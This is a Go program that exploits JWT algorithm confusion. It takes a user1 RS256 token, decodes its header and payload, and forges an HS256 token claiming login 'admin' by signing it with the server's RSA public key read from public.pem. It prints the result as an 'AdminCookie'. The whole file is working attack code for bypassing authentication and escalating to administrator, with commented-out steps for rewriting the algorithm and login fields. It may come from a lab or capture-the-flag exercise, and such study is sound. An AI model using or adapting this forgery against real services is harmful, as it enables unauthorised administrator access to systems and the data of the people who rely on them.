package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/golang-jwt/jwt/v4"
)

// Create admin auth cookie
func generateAdminCookie(srvPublicKey []byte) (string, error) {
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"login": "admin",
	})
	tokenString, err := token.SignedString(srvPublicKey)
	if err != nil {
		return "", err
	}
	return tokenString, nil
}

func main() {
	// user1 auth cookie
	cookieAuthToken := "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InVzZXIxIn0.U3hpjM6YDXlITQjR9mzmF4d5dRxXO2o_JZGZe8JeGvNlcZd_FVOHxLYvPc6EQp9iT43W57hYHIZP8Zf3CQk-mKA8i2wvzmQUDlAn_rz9YoDmsfMYWZL6pphm2bpvL3sj6xTx5irhCVvISzhmJMeTnkBlMyDBs2MjAFTl7Gn_Fc2lfW6niRZ9rZP21L5ikThJF8mx7-DZF27P4wurS2DAcg6BJ-lTdnVL6hFgpACxHA9PfiuyWOjbglHz5s17tmLvvxYPQF8FkgDboQHAyG3ewPd8iUjeVX3uvpsmRTPnmvwLRSAu_5zftGrzgpouBn2fZQFKOwQri_OpM84pKehDLA"
	parts := strings.Split(cookieAuthToken, ".")

	// Extracting the header
	headerBytes, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		fmt.Println("[headerBytes] unexpected error: ", err)
	}
	var headerMap map[string]interface{}
	err = json.Unmarshal(headerBytes, &headerMap)
	if err != nil {
		fmt.Println("[headerJSON]unexpected error: ", err)
	}

	/*
		// Modifying the algorithm
		headerMap["alg"] = "HS256"
		newHeaderBytes, err := json.Marshal(headerMap)
		if err != nil {
			fmt.Println("[json.Marshal]unexpected error: ", err)
		}
		newHeader := base64.StdEncoding.EncodeToString(newHeaderBytes)
	*/

	// Extracting the payload
	payloadBytes, err := base64.StdEncoding.DecodeString(parts[1] + "=")
	if err != nil {
		fmt.Println("[DecodeString] unexpected error: ", err)
	}
	var payloadMap map[string]interface{}
	err = json.Unmarshal(payloadBytes, &payloadMap)
	if err != nil {
		fmt.Println("[json.Unmarshal]unexpected error: ", err)
	}

	/*
		// Modifying the login
		payloadMap["login"] = "admin"
		newPayloadBytes, err := json.Marshal(payloadMap)
		if err != nil {
			fmt.Println("[json.Marshal]unexpected error: ", err)
		}
		newPayload := base64.StdEncoding.EncodeToString(newPayloadBytes)
	*/

	srkPublicKey, err := os.ReadFile("./public.pem")
	if err != nil {
		fmt.Println("[ReadFile]unexpected error: ", err)
	}

	adminCookie, err := generateAdminCookie(srkPublicKey)
	if err != nil {
		fmt.Println("[generateAdminCookie]unexpected error: ", err)
	}

	fmt.Println("AdminCookie =>", adminCookie)
}
